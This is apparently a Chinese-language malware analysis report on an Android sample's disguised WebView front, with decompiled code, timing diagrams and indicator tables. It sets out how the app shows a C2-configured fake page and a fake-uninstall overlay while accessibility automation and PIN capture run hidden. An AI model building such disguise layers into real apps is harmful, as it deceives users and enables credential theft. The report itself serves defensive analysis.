# WebView 伪装前台机制分析

> **样本**: update.apk
> **主 Activity**: `jadx-reference/rock/iuzxujjtqev.java` (WebView 宿主)
> **WebView 管理器**: `jadx-reference/p000/ne1.java` (WebView 初始化 + JS 桥)
> **WebViewClient**: `jadx-reference/p000/le1.java` (页面加载监听)
> **JS 桥**: `jadx-reference/p000/ke1.java` (`window.Android` 接口)
> **WebView 状态追踪**: `jadx-reference/rock/service/dqtvuisjd$startWebViewStatusCheckTask$1.java`
> **配置文件**: `assets/server_config.json` / `files/server_config.json`
> **日期**: 2026-04-19

---

## 一、结论先行

WebView 是 **伪装前台**——嵌入在主 Activity (`iuzxujjtqev`) 中的 Web 页面，让用户以为在使用正常应用（如系统清理工具、安全中心），而后台同时执行权限自动化和密码窃取。

**关键发现**：
- WebView **不是在某个步骤"之后"加载的**，而是在用户开启无障碍后立即加载（`authorization_completed=false` 时）
- 加载时被 ConfigMask 遮罩覆盖，用户看不到；遮罩消失后 WebView 才可见
- `completeInstallationWithCipher` 后通过 `FLAG_ACTIVITY_CLEAR_TOP|NEW_TASK` 复用已有 Activity 实例，WebView **不会被销毁重建**
- `uninstallMode=false` 时 WebView 持续显示；`uninstallMode=true` 时被假卸载覆盖层遮盖

---

## 二、WebView 加载时机

### 2.1 触发链

```
用户开启无障碍 → 从系统设置返回 APP
    → iuzxujjtqev.onResume()
    → 行 2551: m211214c4() = true（无障碍已开启）
    → 行 2561: mainContent.setVisibility(GONE)（隐藏引导 UI）
    → 行 2573: z3 = webViewContainer.getVisibility() == VISIBLE → false
    → 行 2577: m211230e0()（首次调用）
```

### 2.2 m211230e0() — WebView 加载核心方法

**文件**: `iuzxujjtqev.java` 行 1107-1182

```java
public final void m211230e0() {
    // ★ 关键判断：authorization_completed
    boolean authCompleted = getSharedPreferences("app_state")
        .getBoolean("authorization_completed", false);

    if (!this.f51967d2 && authCompleted && !TRIGGER_EXCLUDE) {
        // authCompleted=true → 伪装跳转到系统手机管家 → return
        this.f51967d2 = true;
        m211218c8();
        return;
    }

    // ↓ authCompleted=false 时才到达这里（首次启动、授权未完成）

    if (!isFinishing() && !isDestroyed()) {
        // 1. 从配置文件读取 webUrl
        String url = null;
        JSONObject config = AbstractC0765ko.m213605a3(this);
        String rawUrl = config != null
            ? config.optString("webUrl加密字段 PFwTD180") : null;
        if (rawUrl != null && !rawUrl.isEmpty()) {
            url = AbstractC0765ko.m213602a0(rawUrl);  // 可能需要 AES 解密
        }

        // 2. 使用默认 URL 作为 fallback
        if (url == null || url.isEmpty()) {
            t60.m214726f4("iuzxujjtqev", "⚠️ 配置文件中没有webUrl，使用默认URL");
            url = StringUtil.m212470a0("I00FKl5iQ2FafylYGD5Ydg8hWg==");
        }

        // 3. 获取 WebView 控件
        WebView webView = (WebView) findViewById(R$id.webView);
        if (webView == null) {
            t60.m214704c5("iuzxujjtqev", "❌ 未找到WebView视图，无法加载页面");
            return;
        }

        // 4. 初始化 WebView（JS 桥 + 客户端）
        ne1 manager = new ne1(this);
        manager.f58512a2 = new fh0(21);
        manager.m214073a0(webView);

        // 5. 显示 WebView 容器
        View webViewContainer = findViewById(R$id.webViewContainer);
        if (webViewContainer != null) {
            webViewContainer.setVisibility(View.VISIBLE);  // ★ 设为可见
        }
        WebView webView2 = manager.f58511a1;
        if (webView2 != null) {
            webView2.setVisibility(View.VISIBLE);
        }

        // 6. 启动 WebView 状态更新
        m211231e1();

        // 7. 设置沉浸式 UI
        getWindow().getDecorView().setSystemUiVisibility(256);

        // 8. ★ 加载 URL
        WebView webView3 = manager.f58511a1;
        if (webView3 != null) {
            webView3.loadUrl(url);
        }
    }
}
```

### 2.3 为什么只在 authorization_completed=false 时加载

| `authorization_completed` | `m211230e0()` 行为 | 原因 |
|---|---|---|
| `false`（首次启动） | 跳过行 1112 伪装分支 → 加载 WebView URL | 用户刚开启无障碍，需要看到伪装页面 |
| `true`（授权已完成） | 进入行 1112 → `m211218c8()` 跳转手机管家 → return | 自动化已完成，不再需要伪装 |

---

## 三、WebView 初始化与 JS 桥

### 3.1 ne1 — WebView 管理器

**文件**: `jadx-reference/p000/ne1.java`

```java
public final class ne1 {
    public final iuzxujjtqev f58510a0;  // Activity 引用
    public WebView f58511a1;             // WebView 实例
    public fh0 f58512a2;                 // WebChromeClient 回调

    public final void m214073a0(WebView webView) {
        this.f58511a1 = webView;
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);     // ★ JS 启用
        settings.setDomStorageEnabled(true);      // DOM 存储启用
        webView.setWebViewClient(new le1(this));  // 页面加载监听
        webView.setWebChromeClient(new me1(this)); // Chrome 功能
        webView.addJavascriptInterface(new ke1(this), "Android");  // ★ JS 桥
    }
}
```

### 3.2 ke1 — JS 桥接口

**文件**: `jadx-reference/p000/ke1.java`

```java
public final class ke1 {
    @JavascriptInterface
    public final void processWebClick(String url) {
        // WebView 页面中的 JS 可以调用：
        //   window.Android.processWebClick("https://...")
        // 向 Java 层发送点击事件/URL
    }
}
```

**安全影响**：WebView 页面中的 JavaScript 可以通过 `window.Android.processWebClick()` 与  Java 层通信。C2 服务器可以通过控制 WebView 加载的页面内容来动态下发 JS 指令。

### 3.3 le1 — WebViewClient

**文件**: `jadx-reference/p000/le1.java`

```java
public final class le1 extends WebViewClient {
    @Override
    public final void onPageFinished(WebView webView, String url) {
        super.onPageFinished(webView, url);
        // 页面加载完成回调
        // 通知 fh0 (WebChromeClient 回调)
    }
}
```

---

## 四、WebView URL 来源

### 4.1 URL 读取优先级

| 优先级 | 来源 | 字段 | 处理 |
|---|---|---|---|
| 1 | `files/server_config.json` | `webUrl`（加密字段名 `"PFwTD180"`） | C2 可远程更新 |
| 2 | `assets/server_config.json` | 同上 | APK 内置默认 |
| 3 | URL 值以 `ENC:` 开头 | 去掉前缀后 AES 解密 | `k21.m213444a0()` |
| 4 | 硬编码默认 | `StringUtil.m212470a0("I00FKl5iQ2FafylYGD5Ydg8hWg==")` | XOR 解密 |

### 4.2 配置文件读取逻辑

**文件**: `jadx-reference/p000/AbstractC0765ko.java`

```java
public static JSONObject m213605a3(Context context) {
    String configFileName = f57555a0;  // 加密的文件名
    // 1. 优先读取 files/ 目录（C2 推送的更新）
    File file = new File(context.getFilesDir(), configFileName);
    if (file.exists()) {
        return new JSONObject(readFile(file));
    }
    // 2. 回退到 assets/（APK 内置）
    return new JSONObject(readAsset(context, configFileName));
}
```

### 4.3 URL 解密

```java
// AbstractC0765ko.m213602a0() — URL 解密
public static String m213602a0(String str) {
    if (str.startsWith("ENC:")) {
        // AES 解密
        String encrypted = str.substring(4);
        return k21.m213444a0(encrypted);
    }
    // 明文 URL 直接返回
    return str;
}
```

---

## 五、WebView 生命周期管理

### 5.1 WebView 状态追踪

**文件**: `dqtvuisjd.java`

`dqtvuisjd` 主服务通过 `f52360m3`（`volatile boolean`）追踪 WebView 是否正在显示：

```java
// 设置 WebView 状态
public final void setWebViewOpen(boolean z) {
    dqtvuisjd.f52360m3 = z;
    dqtvuisjd.f52363m6 = System.currentTimeMillis();
}
```

**调用点**：

| 调用位置 | 设置值 | 时机 |
|---|---|---|
| `iuzxujjtqev.m211231e1()` | `true` | WebView 开始显示 |
| `iuzxujjtqev.m211233e3()` | `false` | WebView 停止显示 |
| `iuzxujjtqev.onResume()` | `true` | Activity 恢复且 WebView 可见 |
| `iuzxujjtqev.onPause()` | `false` | Activity 暂停 |
| `hk1.run()` | `true` | 定时刷新（500ms 间隔） |

### 5.2 WebView 状态检查定时任务

**文件**: `dqtvuisjd$startWebViewStatusCheckTask$1.java`

```java
// 每秒检查 WebView 状态
if (dqtvuisjd.f52360m3) {  // WebView 标记为打开
    long timeSinceLastUpdate = now - dqtvuisjd.f52363m6;
    if (timeSinceLastUpdate > 500) {  // 500ms 无活动
        dqtvuisjd.f52360m3 = false;   // 重置为关闭
        t60.m214714d6("dqtvuisjd", "WebView状态已超时");
    }
}
```

### 5.3 WebView 状态对无障碍的影响

WebView 打开时，无障碍服务会暂停某些操作，避免冲突：

```java
// dqtvuisjd.java 行 9771
if (this.f52414e5 == null || f52360m3) {
    // WebView 打开 → 跳过某些无障碍操作
}

// dqtvuisjd.java 行 9848
if (!isPermissionRequestActive() && !f52360m3) {
    // WebView 未打开且无权限申请 → 可以触发配置遮盖
}
```

---

## 六、WebView 在 completeInstallation 后的持久性

### 6.1 g60 (InstallCompleteMgr) 重新激活 Activity

```java
// g60.java — 行 43-54
Intent intent = new Intent(context, iuzxujjtqev.class);
intent.addFlags(FLAG_ACTIVITY_NEW_TASK      // 268435456
              | FLAG_ACTIVITY_CLEAR_TOP     // 67108864
              | FLAG_ACTIVITY_NO_ANIMATION); // 536870912
intent.putExtra("from_installation_complete", true);
intent.putExtra("show_webview", true);
context.startActivity(intent);
```

**`FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP`** = singleTask 等效行为：
- 已有的 `iuzxujjtqev` 实例**不会被销毁**
- 调用 `onNewIntent()` 传入新 Intent
- WebView View 树和加载状态**原封不动保留**

### 6.2 onNewIntent 处理

```java
// iuzxujjtqev.java 行 2133-2204
public final void onNewIntent(Intent intent) {
    setIntent(intent);

    // 伪装检查
    if (!f51967d2 && authorization_completed) {
        if (z2 || m211216c6() || m211215c5()) {
            // uninstallMode=true → 图标已隐藏 → 跳转手机管家 → return
            m211218c8();
            return;
        }
        // uninstallMode=false → 不 return，继续
    }

    // show_webview 处理
    if (from_installation_complete && show_webview) {
        // 确认布局存在（已存在）
        if (findViewById(R.id.webView) == null) {
            setContentView(R$layout.rbv2f);
        }
        // 启动保活
        al1.getInstance(this).m209821a1();
        return;  // ★ 没有调用 loadUrl()，WebView 保持之前的内容
    }
}
```

### 6.3 随后的 onResume

```java
// iuzxujjtqev.java 行 2538-2577
View webViewContainer = findViewById(R.id.webViewContainer);
boolean z3 = webViewContainer != null
    && webViewContainer.getVisibility() == View.VISIBLE;
// z3 = true（WebView 在首次启动时已设为 VISIBLE）

if (z3) {
    setWebViewOpen(true);
    webView.onResume();
}

if (z3) {
    // ★ WebView 已可见 → 跳过 m211230e0() → 不会触发伪装跳转
} else {
    m211230e0();
}
```

### 6.4 uninstallMode 对 WebView 的影响

| 场景 | onNewIntent | onResume | WebView 结果 |
|---|---|---|---|
| `uninstallMode=true` | `m211216c6()=true` → `m211218c8()` → return | 不执行 | Activity 跳转手机管家 → finish → **WebView 销毁** |
| `uninstallMode=false` | `m211216c6()=false` → 继续到 `show_webview` → return | `z3=true` → 跳过 | **WebView 继续显示** |

---

## 七、WebView 的设计意图

### 7.1 三层伪装策略

WebView 是  三层伪装策略中的第二层：

```
┌─ 层 1: ConfigMask 遮罩 ─── 权限自动化期间 ────────┐
│  "配置中请稍后..." + 进度条                         │
│  防止用户看到自动化操作                             │
│  消失条件：权限 + C2 + 注册 + WRITE_SETTINGS        │
└────────────────────────────────────────────────────┘
                    ↓ 遮罩消失后
┌─ 层 2: WebView 伪装页面 ─── PIN 捕获期间 ─────────┐
│  加载 C2 配置的 Web 页面（如系统清理工具）           │
│  用户以为在使用正常应用                             │
│  消失条件：uninstallMode=true 时被假卸载覆盖        │
└────────────────────────────────────────────────────┘
                    ↓ 安装完成后
┌─ 层 3a: 假卸载覆盖 (uninstallMode=true) ──────────┐
│  PkgVerifyOverlay + hideIcon                       │
│  "应用已卸载" + 图标消失                           │
└────────────────────────────────────────────────────┘
┌─ 层 3b: WebView 持续 (uninstallMode=false) ────────┐
│  WebView 继续显示，图标保留                         │
│  用户以为 APP 仍在正常运行                         │
└────────────────────────────────────────────────────┘
```

### 7.2 back 键拦截

```java
// iuzxujjtqev.java 行 1414-1427
@Override
public final void onBackPressed() {
    View webViewContainer = findViewById(R.id.webViewContainer);
    if (webViewContainer == null || webViewContainer.getVisibility() != VISIBLE) {
        super.onBackPressed();  // 正常退出
        return;
    }
    WebView webView = (WebView) findViewById(R.id.webView);
    if (webView == null || !webView.canGoBack()) {
        super.onBackPressed();  // WebView 没有历史 → 退出
    } else {
        webView.goBack();  // ★ WebView 有历史 → 返回上一页（不退出 APP）
    }
}
```

### 7.3 WebView 与 ConfigMask 遮罩的时序协同

```
T+0.0s  用户开启无障碍
T+0.4s  ★ ConfigMask 遮罩显示（用户看到进度条）
T+0.7s  ★ WebView loadUrl()（在遮罩下面加载，用户看不到）
        │
        │  ConfigMask 遮罩覆盖全屏
        │  WebView 在下面静默加载完成
        │  yw5xud 权限自动化执行中
        │
T+60s   ★ ConfigMask 遮罩消失（4 条件满足）
        → WebView 页面此时才被用户看到
        │
        │  用户看到 WebView 伪装页面
        │  PIN 捕获在此期间执行
        │
T+85s   completeInstallationWithCipher
        → g60 重新激活 Activity (onNewIntent)
        → WebView 保持不变
        → uninstallMode 分叉
```

---

## 八、特征

### 8.1 特征

| 特征 | 值 |
|---|---|
| Activity 类名 | `iuzxujjtqev` |
| 布局 ID | `R$layout.rbv2f` |
| WebView 控件 ID | `R$id.webView` / `R$id.webViewContainer` |
| JS 桥名称 | `"Android"` |
| JS 桥方法 | `processWebClick(String url)` |
| WebViewClient | `le1` |
| WebChromeClient | `me1` |

### 8.2 配置特征

| 字段 | 位置 | 含义 |
|---|---|---|
| `webUrl` | `server_config.json`（加密字段 `"PFwTD180"`） | WebView 加载的 URL |
| `ENC:` 前缀 | URL 值 | 表示 URL 经过 AES 加密 |

### 8.3 文件 IOC

| 文件 | 含义 |
|---|---|
| `files/webview_state_test.json` | `{opened:true}` — WebView 已打开标记 |
| `files/server_config.json` | C2 推送的配置更新（含 webUrl） |

### 8.4 Logcat 标签

| 标签 | 关键日志 |
|---|---|
| `iuzxujjtqev` | `"❌ 未找到WebView视图，无法加载页面"` |
| `iuzxujjtqev` | `"⚠️ 配置文件中没有webUrl，使用默认URL"` |
| `iuzxujjtqev` | `"❌ Activity已销毁或正在结束，无法启动WebView"` |
| `ConfigReader` | `"配置文件中没有webUrl或为空"` |
| `ConfigReader` | `"获取webUrl失败"` |
| `WebViewStateStore` | `"写入WebView状态失败"` |

### 8.5 网络 IOC

| 类型 | 值 |
|---|---|
| WebView URL | 配置文件 `webUrl` 字段值 |
| 默认 URL | `StringUtil.m212470a0("I00FKl5iQ2FafylYGD5Ydg8hWg==")` 解密后的值 |
| User-Agent | 标准 Android WebView UA |


---

## 九、与其他文档交叉关联

| 文档 | 关联点 |
|---|---|
| `ConfigMask配置遮罩机制分析.md` | 遮罩与 WebView 的层叠关系和时序协同 |
| `Vendor自动化脚本执行完成后完整执行链路分析.md` | WebView 在完整执行链中的位置 |
| `基础设施层通信审计报告.md` | `server_config.json` 配置文件共享 |
| `OPPO系权限获取机制分析.md` / `华为荣耀权限获取机制分析.md` | yw5xud 在 WebView 背后执行 |
